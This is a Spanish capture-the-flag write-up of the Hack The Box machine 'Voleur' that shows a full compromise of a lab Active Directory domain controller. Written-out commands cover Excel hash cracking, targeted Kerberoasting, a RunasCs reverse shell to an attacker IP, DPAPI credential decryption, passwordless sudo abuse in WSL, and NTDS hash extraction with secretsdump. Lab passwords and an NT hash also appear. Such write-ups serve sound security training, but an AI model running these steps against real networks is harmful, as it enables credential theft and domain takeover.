---
title: "Voleur (Medium)"
date: 2026-11-07
author: "Isma"
slug: "voleur"
tags: ["Windows", "AD", "Kerberos", "SMB", "Targeted Kerberoasting", "Hash Cracking", "AD Recycle Bin", "DPAPI", "WSL", "Sudo", "NTDS", "Pass-the-Hash"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Voleur es un controlador de dominio Windows con **NTLM deshabilitado**, así que todo el ataque se mueve por SMB y WinRM autenticados con Kerberos. Con las credenciales de salida (`ryan.naylor`) encuentro en un recurso compartido un Excel protegido con contraseña que contiene las credenciales de varias cuentas de servicio. Con `svc_ldap` hago **Kerberoasting dirigido** sobre `lacey.miller` y `svc_winrm`, y con la contraseña de `svc_winrm` entro por WinRM. Dentro descubro que un usuario, `Todd.Wolfe`, fue borrado, así que lo restauro desde la **Papelera de Reciclaje de AD** usando `svc_ldap` (miembro del grupo `RESTORE_USERS`) suplantado con **RunasCs**. Eso me da acceso a un recurso con credenciales guardadas en el **Gestor de Credenciales de Windows**, que descifro con **DPAPI** y me dan la contraseña de `jeremy.combs`. Su clave SSH privada pertenece en realidad a `svc_backup`, que tiene **sudo total sin contraseña** dentro de un entorno **WSL** instalado en el DC, donde encuentro una copia de respaldo de `ntds.dit` y del hive `SYSTEM`. Con ellos extraigo todos los hashes del dominio y entro como Administrator.

## Reconocimiento

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http          (WinRM)
9389/tcp  open  mc-nmf

Host script results:
|_clock-skew: 7h59m59s
Service Info: Host: DC; OSs: Windows, Linux
```

Un **controlador de dominio** de `voleur.htb` con dos detalles interesantes desde ya: **SSH en el puerto 2222** (que resultará ser WSL dentro del propio DC) y un desfase de reloj de **casi 8 horas** que exigirá `faketime` en casi todos los comandos Kerberos.

HTB da credenciales de salida:

```
ryan.naylor : HollowOct31Nyt
```

### NTLM deshabilitado: todo por Kerberos

Al igual que en otras máquinas de este estilo, el dominio no acepta NTLM. Configuro `/etc/krb5.conf` y `/etc/hosts` para `dc.voleur.htb` y trabajo siempre con `-k` (Kerberos) en vez de usuario/contraseña NTLM:

```bash
nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

### Enumeración con RustHound

Recojo datos de BloodHound. `ryan.naylor` pertenece a varios grupos, entre ellos **`FIRST-LINE TECHNICIANS`**, que probablemente da acceso a un recurso de IT por SMB.

![voleur](/images/obsidian/voleur/pasted-image-20260903103533.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903104835.png)

## Acceso Inicial (Foothold)

### Excel protegido con credenciales

```bash
faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --spider IT --pattern ''
```

```
//dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx
```

```bash
faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k \
  --share IT --get-file "First-Line Support/Access_Review.xlsx" Access_Review.xlsx
```

El archivo está protegido con contraseña:

![voleur](/images/obsidian/voleur/pasted-image-20260903105356.png)

Extraigo el hash con `office2john` y lo crackeo:

```bash
office2john.py Access_Review.xlsx > excel.hash
john --wordlist=/usr/share/wordlists/rockyou.txt excel.hash
```

```
football1
```

LibreOffice no logra abrirlo correctamente, así que genero un script en Python (con ayuda de un LLM) para volcar su contenido en la terminal:

![voleur](/images/obsidian/voleur/pasted-image-20260903110205.png)

Dentro hay una tabla de revisión de accesos con **credenciales de varias cuentas de servicio**:

![voleur](/images/obsidian/voleur/pasted-image-20260903110545.png)

| Usuario | Contraseña | Nota |
|---|---|---|
| `svc_ldap` | `M1XyC9pW7qT5Vn` | |
| `svc_iis` | `N5pXyW1VqM7CZ8` | |
| `Todd.Wolfe` | `NightT1meP1dg3on14` | "account deleted" |

Ninguna tiene acceso directo por WinRM, pero sí por SMB:

```bash
faketime -f +8h nxc winrm dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn'
```

```
[-] ... Invalid NTLM challenge received from server. nxc winrm only supports NTLM currently
```

(Aquí `nxc winrm` solo soporta NTLM, así que no sirve para probar WinRM en este dominio — otra razón más para seguir por Kerberos en el resto del ataque).

![voleur](/images/obsidian/voleur/pasted-image-20260903110909.png)

## Movimiento Lateral

### Kerberoasting dirigido con svc_ldap

`svc_ldap` tiene permiso `WriteSPN` sobre otras cuentas. Uso **targetedKerberoast** para asignarles SPN temporales, pedir sus TGS y quitarlo de nuevo:

```bash
export KRB5CCNAME=$(pwd)/svc_ldap.ccache
faketime -f +8h python targetedKerberoast.py -d voleur.htb -u svc_ldap -k --no-pass \
  --dc-ip 10.129.118.3 --dc-host dc.voleur.htb -v
```

![voleur](/images/obsidian/voleur/pasted-image-20260903111417.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903111444.png)

```
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB...
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB...
```

Crackeo ambos con hashcat. Solo uno cede:

![voleur](/images/obsidian/voleur/pasted-image-20260903111652.png)

```
svc_winrm : AFireInsidedeOzarctica980219afi
```

### Acceso por WinRM (con ticket Kerberos)

```bash
faketime -f +8h evil-winrm -i dc.voleur.htb -u svc_winrm -r VOLEUR.HTB
```

![voleur](/images/obsidian/voleur/pasted-image-20260903112131.png)

Entro con una shell interactiva y leo la **User Flag**. Enumero el sistema, pero inicialmente no encuentro nada evidente: `lacey.miller` es miembro de `Second-Line Support` y `jeremy` de `Third-Line Support`, y hay recursos de esos niveles a los que `svc_winrm` no llega.

![voleur](/images/obsidian/voleur/pasted-image-20260903112436.png)

### Restaurar a Todd.Wolfe desde la Papelera de Reciclaje

Recuerdo que `Todd.Wolfe` apareció en el Excel como "cuenta eliminada". `svc_ldap` es miembro del grupo **`RESTORE_USERS`**, que da permiso para restaurar objetos de la Papelera de Reciclaje de AD. El problema es que no tengo forma de ejecutar comandos directamente como `svc_ldap` desde la shell de `svc_winrm`, así que uso **RunasCs** para lanzar un proceso bajo esas credenciales:

```powershell
.\RunasCs.exe svc_ldap 'M1XyC9pW7qT5Vn' cmd.exe -r 10.10.15.125:4444
```

![voleur](/images/obsidian/voleur/pasted-image-20260903114719.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903114733.png)

Con la shell resultante (ya como `svc_ldap`), importo el módulo de AD y busco en la papelera:

```powershell
Import-Module ActiveDirectory
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted
```

```
CN        : Todd Wolfe DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
isDeleted : True
objectSid : S-1-5-21-3927696377-1337352550-2781715495-1110
```

Lo restauro:

```powershell
Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
```

### Credenciales DPAPI en el share de Second-Line

Con `Todd.Wolfe` restaurado (y su contraseña del Excel), entro al recurso de **Second-Line Support**:

```bash
smbclient //dc.voleur.htb/IT -U voleur.htb/todd.wolfe
```

![voleur](/images/obsidian/voleur/pasted-image-20260903115531.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903120843.png)

Encuentro un `ConsoleHost_history.txt` sin información directa útil:

![voleur](/images/obsidian/voleur/pasted-image-20260903121033.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903121126.png)

Pero apunta a una carpeta `Credentials` dentro del perfil del usuario: el propio Todd dejó constancia en su historial de cómo acceder al **Gestor de Credenciales de Windows**:

![voleur](/images/obsidian/voleur/pasted-image-20260903121405.png)

```
cd Credentials
ls
DFBE70A7E5CC19A398EBF1B96859CE5D
```

Descargo ese blob de credencial, y también la **master key** de DPAPI asociada al SID del usuario, en la carpeta `Protect`:

![voleur](/images/obsidian/voleur/pasted-image-20260903121535.png)

```
cd Protect
ls
S-1-5-21-3927696377-1337352550-2781715495-1110
```

### Descifrado con impacket-dpapi

Con la contraseña de `Todd.Wolfe` (`NightT1meP1dg3on14`) descifro primero la master key:

```bash
impacket-dpapi masterkey -file S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
```

```
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Y con esa clave descifro la credencial guardada:

```bash
impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd2832547...a83
```

```
[CREDENTIAL]
Target   : Domain:target=Jezzas_Account
Username : jeremy.combs
Unknown  : qT3V9pLXyN7W4m
```

![voleur](/images/obsidian/voleur/pasted-image-20260903121909.png)

![voleur](/images/obsidian/voleur/pasted-image-20260903122418.png)

## Escalada de Privilegios

### Acceso a Third-Line Support con jeremy.combs

```bash
faketime -f +8h impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip 10.129.118.3
export KRB5CCNAME=jeremy.combs.ccache
```

Con este ticket accedo al share de **Third-Line Support**, donde hay una clave SSH privada y una nota:

```
Note.txt.txt

Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of
the backup tools from Linux.

Please see what you can set up.

Thanks,
Admin
```

La clave privada lleva en un comentario al final **`svc_backup@DC`**, lo que indica que no pertenece a `jeremy` sino a una cuenta `svc_backup` usada dentro de un entorno **WSL** instalado en el propio DC (de ahí el SSH en el puerto 2222 que vi en el nmap).

### sudo sin contraseña dentro de WSL

```bash
ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb
sudo -l
```

```
User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

![voleur](/images/obsidian/voleur/pasted-image-20260903123849.png)

`svc_backup` tiene **sudo total sin contraseña** dentro de WSL. Reviso el sistema de ficheros (que en WSL expone el disco de Windows en `/mnt/c`) y encuentro una copia de seguridad de Active Directory que alguien dejó ahí, justo lo que sugería la nota de "backup tools from Linux":

```
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```

### Extracción offline de todos los hashes del dominio

Descargo los tres ficheros por SCP:

```bash
scp -i id_rsa -P 2222 "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
scp -i id_rsa -P 2222 "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
```

![voleur](/images/obsidian/voleur/pasted-image-20260903124530.png)

Y extraigo los hashes offline con `secretsdump` a partir de `ntds.dit` + `SYSTEM`, sin necesidad de ninguna sesión contra el DC:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

![voleur](/images/obsidian/voleur/pasted-image-20260903124606.png)

### Acceso final como Administrator

Con NTLM deshabilitado, entro de nuevo por Kerberos, usando el hash NT como clave (overpass-the-hash) para obtener un TGT:

```bash
faketime -f +8h impacket-smbexec voleur.htb/Administrator@dc.voleur.htb -k -no-pass
```

```
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

![voleur](/images/obsidian/voleur/pasted-image-20260903125226.png)

También válido por WinRM:

```bash
faketime -f +8h evil-winrm -i dc.voleur.htb -u Administrator -r VOLEUR.HTB
```

![voleur](/images/obsidian/voleur/pasted-image-20260903125425.png)

Leo la **Root Flag** desde el escritorio de `Administrator`.

## Conclusiones

- Un Excel "protegido con contraseña" en un recurso compartido es, en la práctica, zip cifrado crackeable offline, y muchas veces contiene justo lo que su nombre promete: una revisión de accesos con credenciales incluidas.
- El Kerberoasting dirigido (`WriteSPN` + pedir TGS + quitar SPN) permite atacar cuentas sin SPN propio, no solo las que ya tienen uno asignado.
- La Papelera de Reciclaje de AD vuelve a aparecer como vector: un grupo con permiso de restauración (`RESTORE_USERS`) es tan sensible como uno con `GenericAll` sobre esos objetos.
- El Gestor de Credenciales de Windows cifrado con DPAPI no es una caja fuerte inexpugnable: con la master key del usuario (derivable de su contraseña) se descifra sin más.
- Un backup de `ntds.dit` + `SYSTEM` dejado accesible en cualquier recurso equivale a tener el hash de todo el dominio, sin pasar ni una vez por el DC en caliente.
